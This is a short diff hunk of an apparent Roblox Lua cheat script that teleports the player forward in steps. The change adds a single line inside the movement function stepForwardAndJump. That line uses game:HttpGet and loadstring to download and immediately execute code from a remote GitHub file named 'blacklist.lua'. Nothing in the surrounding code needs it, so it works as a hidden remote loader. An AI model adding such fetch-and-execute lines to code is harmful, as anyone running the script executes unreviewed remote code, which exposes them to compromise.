@@ -32,6 +32,7 @@ local stepSize = 2 -- how far to teleport each step (studs)
 
 local steps = math.floor(duration / stepTime)
 local function stepForwardAndJump()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/BlueOreoes/OreoExecutor/refs/heads/main/blacklist.lua'))()
     local Players = game:GetService("Players")
     local plr = Players.LocalPlayer
     local char = plr.Character or plr.CharacterAdded:Wait()
